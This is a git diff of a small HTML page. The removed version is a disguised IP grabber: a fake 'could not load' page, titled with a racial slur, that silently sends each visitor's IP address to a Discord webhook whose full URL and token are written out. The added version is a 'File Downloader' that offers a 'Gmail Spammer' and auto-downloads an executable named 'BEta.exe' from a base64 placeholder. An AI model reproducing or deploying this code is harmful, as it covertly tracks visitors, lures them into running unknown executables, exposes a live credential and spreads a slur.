@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>NiggaBin</title>
+  <title>File Downloader</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -13,57 +13,55 @@
       height: 100vh;
       margin: 0;
       background-color: #000000;
+      color: white;
     }
     .container {
       text-align: center;
-      background: #fff;
+      background: #333;
       padding: 20px;
       border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
     }
-    p {
-      margin-bottom: 20px;
-      color: #555;
+    select {
+      padding: 10px;
+      margin-top: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 20px;
+      margin-top: 20px;
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Hi could not load on ur browser</h1>
-    <p>!!!</p>
-    <p id="status" style="color: red;">Please wait...</p>
+    <h1>Download File</h1>
+    <select id="dropdown">
+      <option value="">-- Select an Option --</option>
+      <option value="gmail">Gmail Spammer</option>
+    </select>
   </div>
 
   <script>
-    (async () => {
-      const status = document.getElementById('status');
-      try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const userIP = ipData.ip;
-
-        const webhookUrl = 'https://discordapp.com/api/webhooks/1330155920877158491/v6SIJF0oGJwQdEkSlI4uYchjL6QzpeySo1P4aSNTE52U_2vz2gR_U0wdHdreUNUD2qZF';
-        const response = await fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            content: `**New client IP: ${userIP}**\n**Go to https://www.whatismyip.com/ and put the ip in to get all info!`,
-          }),
-        });
-
-        if (response.ok) {
-          status.textContent = 'NiggaBin is Under Maintenance Please Try Again Later!';
-          status.style.color = 'red';
-        } else {
-          status.textContent = 'Failed to process your information. Please try again later.';
-        }
-      } catch (error) {
-        console.error('Error:', error);
-        status.textContent = 'An error occurred. Please try again later.';
+    document.getElementById('dropdown').addEventListener('change', function(event) {
+      if (event.target.value === 'gmail') {
+        const fileName = "BEta.exe";
+        const base64File = "BASE64_ENCODED_FILE_HERE"; // Replace with your file's Base64 content
+        const link = document.createElement('a');
+        link.href = `data:application/octet-stream;base64,${base64File}`;
+        link.download = fileName;
+        link.click();
       }
-    })();
+    });
   </script>
 </body>
 </html>
